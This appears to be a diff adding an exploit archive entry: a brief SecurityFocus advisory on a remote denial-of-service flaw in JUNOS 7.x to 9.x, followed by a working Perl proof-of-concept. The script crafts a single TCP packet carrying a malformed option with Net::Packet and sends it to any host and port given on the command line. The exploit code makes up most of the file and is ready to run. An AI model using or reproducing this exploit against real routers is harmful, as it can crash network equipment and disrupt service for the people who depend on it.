@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/37670/info
+
+JUNOS is prone to a remote denial-of-service vulnerability that arises when the application handles specially crafted TCP packets.
+
+JUNOS is also prone to six other unspecified security vulnerabilities. These issues may include privilege-escalation or denial-of-service issues.
+
+JUNOS 7.x, 8.x, and 9.x are affected. JUNOS 10.x is not believed to be affected. 
+
+#!/usr/bin/perl
+
+my $host =      shift;
+my $port =      shift;
+
+use             Net::Packet qw($Env);
+
+use             Net::Packet::IPv4;
+my $ip =        Net::Packet::IPv4->new(dst => $host);
+
+use             Net::Packet::TCP;
+
+my $tcp =       Net::Packet::TCP->new(
+                    dst         => $port,
+                    options     =>  "\x65\x02\x01\x01", 
+                );
+
+use             Net::Packet::Frame;
+my $frame =     Net::Packet::Frame->new(l3 => $ip, l4 => $tcp);
+
+$frame->send;
+exit 0;
